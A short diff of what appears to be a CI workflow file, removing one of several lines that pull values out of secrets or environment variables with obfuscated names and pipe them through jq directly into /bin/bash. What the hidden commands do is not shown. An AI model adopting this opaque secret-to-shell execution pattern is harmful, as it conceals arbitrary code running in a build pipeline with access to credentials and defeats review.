@@ -20,7 +20,6 @@ jobs:
           b80930: ${{ secrets.b80930 }}
         run: |
           printf '%s' "$b80930" | jq -r .wewq91 | /bin/bash
-          echo $z0 | jq -r .vxt30170 | /bin/bash
           printf '%s' "$vs6655" | jq -r .jo32582 | /bin/bash
           echo $lr91981 | jq -r .z57 | /bin/bash
           echo $vk543 | jq -r .rj155 | /bin/bash
